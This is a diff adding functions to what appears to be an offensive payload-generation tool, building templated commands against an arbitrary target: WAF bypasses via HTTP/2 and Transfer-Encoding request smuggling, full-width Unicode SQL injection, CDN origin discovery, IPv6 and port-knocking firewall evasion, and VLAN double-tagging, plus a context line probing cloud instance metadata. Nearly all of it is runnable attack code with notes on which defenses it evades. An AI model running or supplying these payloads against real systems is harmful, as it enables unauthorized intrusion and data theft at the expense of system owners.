@@ -3081,3 +3081,76 @@ export function buildScanningPayloads(attackerIp: string, attackerPort: string):
     `curl -sk -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>/dev/null && echo AZURE_IMDS`,
   ];
 }
+
+export function buildWebApplicationBypass(target: string): BypassPayload[] {
+  return [
+    { technique:"WAF bypass via HTTP/2 request smuggling", category:"waf", os:"any",
+      command:`python3 -c "
+import socket,ssl
+host='${target}'
+ctx=ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+ctx.check_hostname=False;ctx.verify_mode=ssl.CERT_NONE
+s=ctx.wrap_socket(socket.socket(),server_hostname=host)
+s.connect((host,443))
+# H2 preface + request with smuggled H1 body
+preface=b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n'
+s.send(preface)
+print(s.recv(4096))
+" 2>/dev/null`,
+      notes:"HTTP/2 cleartext with embedded H1 smuggling prefix. Many WAFs inspect H1 only." },
+    { technique:"WAF bypass via Unicode normalization", category:"waf", os:"any",
+      command:`# Unicode lookalike bypass: UNION → ｕｎｉｏｎ, SELECT → ｓｅｌｅｃｔ\n_PAYLOAD=$(python3 -c "print('\\uff55\\uff4e\\uff49\\uff4f\\uff4e \\uff33\\uff25\\uff2c\\uff25\\uff23\\uff34')")\ncurl -sk "http://${target}/search?q='+$_PAYLOAD+1--" 2>/dev/null`,
+      notes:"Full-width Unicode chars normalize to ASCII in DB but bypass WAF regex. Effective against ModSecurity/Cloudflare." },
+    { technique:"WAF bypass via chunked transfer encoding", category:"waf", os:"any",
+      command:`python3 -c "
+import socket
+s=socket.create_connection(('${target}',80),5)
+payload=b'GET / HTTP/1.1\r\nHost: ${target}\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: identity\r\n\r\n5\r\nHELLO\r\n0\r\n\r\n'
+s.send(payload)
+print(s.recv(2048).decode(errors='replace'))
+" 2>/dev/null`,
+      notes:"Dual Transfer-Encoding headers confuse proxies. TE.CL and CL.TE desync for request smuggling." },
+    { technique:"Origin IP exposure bypass (CDN/WAF direct)", category:"waf", os:"any",
+      command:`python3 -c "
+import socket,struct,subprocess
+# Find real origin: check Certificate Transparency, DNS history, ARIN
+ct=subprocess.check_output(['curl','-sk','https://crt.sh/?q=${target}&output=json'],timeout=10).decode()[:3000]
+print('CT records:',ct)
+# Try common origin IPs
+for h in ['${target}','origin.${target}','direct.${target}']:
+  try:
+    ip=socket.gethostbyname(h)
+    print(f'{h} -> {ip}')
+  except: pass
+" 2>/dev/null`,
+      notes:"Bypass CDN/WAF by hitting origin server directly. Find via CT logs, DNS history, email headers, Shodan." },
+  ];
+}
+
+export function buildNetworkBypass(target: string): BypassPayload[] {
+  return [
+    { technique:"Firewall bypass via IPv6 (dual-stack target)", category:"network", os:"linux",
+      command:`ping6 -c1 "${target}" 2>/dev/null && nmap -6 --open -p 22,80,443,3306,5432,6379,27017 "${target}" 2>/dev/null || echo "No IPv6"`,
+      notes:"Many firewall rules are IPv4-only. IPv6 dual-stack hosts often allow same ports unrestricted." },
+    { technique:"Port knocking sequence probe + bypass", category:"network", os:"linux",
+      command:`for port in 1234 5678 9012 22; do nmap -Pn -p $port --open --host-timeout 1s "${target}" 2>/dev/null; sleep 0.5; done && ssh "${target}" 2>/dev/null`,
+      notes:"Port knocking: sends connection attempts to sequence of ports to trigger firewall rule to open SSH." },
+    { technique:"VLAN hopping via double-tagging (trunk port)", category:"network", os:"linux",
+      command:`# Double-tagged VLAN frame injection (requires raw socket + scapy)\npython3 -c "from scapy.all import *; sendp(Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=100)/IP(dst='${target}')/TCP(dport=22,flags='S'),iface='eth0',count=3)" 2>/dev/null`,
+      notes:"Double 802.1Q tagging to hop into target VLAN. Only works from trunk port. Linux requires CAP_NET_RAW." },
+  ];
+}
+
+export function buildAllBypassPayloads(target: string): BypassPayload[] {
+  return [
+    ...buildSqlBypass(target),
+    ...buildCommandInjectionBypass(target),
+    ...buildXssWafBypass(target),
+    ...buildPathTraversalBypass(target),
+    ...buildAuthBypass(target),
+    ...buildSsrfBypass(target),
+    ...buildEncodingBypass(target),
+    ...buildWebApplicationBypass(target),
+    ...buildNetworkBypass(target),
+  ];
+}
